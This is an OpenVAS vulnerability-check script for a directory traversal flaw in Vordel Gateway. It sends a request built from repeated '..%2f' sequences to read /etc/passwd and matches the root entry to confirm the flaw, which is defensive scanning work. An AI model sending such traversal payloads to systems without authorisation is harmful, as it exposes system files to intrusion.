###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vordel_gateway_47975.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Vordel Gateway Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Vordel Gateway is prone to a directory-traversal vulnerability because
it fails to sufficiently sanitize user-supplied input.

A remote attacker could exploit this vulnerability using directory-
traversal strings (such as '../') to gain access to arbitrary files on
the targeted system. This may result in the disclosure of sensitive
information or lead to a complete compromise of the affected computer.

Vordel Gateway 6.0.3 is vulnerable; other versions may also be
affected.";

tag_solution = "Reportedly, the issue is fixed; however, Symantec has not confirmed
this. Please contact the vendor for more information.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103163");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-05-31 13:49:33 +0200 (Tue, 31 May 2011)");
 script_bugtraq_id(47975);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("Vordel Gateway Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/47975");
 script_xref(name : "URL" , value : "https://www.upsploit.com/index.php/advisories/view/UPS-2011-0023");
 script_xref(name : "URL" , value : "http://www.vordel.com/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 8090);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

url = string("/manager/", crap(data:"..%2f",length:9*5),"etc%2Fpasswd"); 

if(http_vuln_check(port:port, url:url, pattern:"root:x:0:[01]:.*")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);

